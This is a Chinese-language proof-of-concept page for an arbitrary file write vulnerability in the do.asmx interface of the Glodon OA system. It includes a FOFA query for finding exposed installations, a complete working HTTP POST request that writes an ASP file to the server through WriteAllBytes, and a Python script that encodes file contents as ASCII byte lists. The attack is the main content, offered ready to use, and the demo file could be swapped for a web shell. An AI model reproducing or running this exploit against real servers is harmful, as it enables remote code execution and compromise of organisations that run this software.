# 广联达OA系统接口do.asmx存在任意文件写入漏洞

广联达OA系统接口do.asmx存在任意文件写入漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

## fofa

```javascript
body="Services/Identification/login.ashx" || header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
```

## poc

```javascript
POST /m/mobileAction.ashx/do.asmx?controller=Microsoft.VisualBasic.FileIO.FileSystem%2c%20Microsoft.VisualBasic%2c%20Version%3d8.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3db03f5f7f11d50a3a&action=WriteAllBytes HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/json
Connection: close

["\"D:\\\\Program Files (x86)\\\\Glodon\\\\GTP\\\\data\\\\gtp-default\\\\FileStorage\\\\UserFiles\\\\1.asp\"","[60, 37, 32, 82, 101, 115, 112, 111, 110, 115, 101, 46, 87, 114, 105, 116, 101, 40, 34, 72, 101, 108, 108, 111, 44, 32, 87, 111, 114, 108, 100, 34, 41, 32, 37, 62]","false"]
```

请求体中的上传路径并不通用，需要根据实际环境选择，文件的内容需要转换为ASCII码

```python
def ascii_to_char(ascii_codes):  
    """将ASCII码列表转换为字符"""  
    return ''.join(chr(code) for code in ascii_codes)  
  
def char_to_ascii(char):  
    """将字符串转换为ASCII码列表"""  
    return [ord(c) for c in char]  
  
def main():  
    print("0 字符转ASCII码")  
    print("1 ASCII码转字符")  
    choice = input("请选择转换类型（0/1）: ")  
  
    if choice == '0':  
        # 字符转ASCII码  
        chars = input("请输入要转换的字符: ")  
        ascii_codes = char_to_ascii(chars)  
        print("字符转ASCII码:", ascii_codes)  
    elif choice == '1':  
        # ASCII码转字符  
        ascii_codes_str = input("请输入以逗号分隔的ASCII码（例如：65,66,67）: ")  
        ascii_codes = [int(code.strip()) for code in ascii_codes_str.split(',')]  
        converted_chars = ascii_to_char(ascii_codes)  
        print("ASCII码转字符:", converted_chars)  
    else:  
        print("无效的输入，请输入0或1。")  
  
if __name__ == "__main__":  
    main()
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409141650271.png)

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409141650535.png)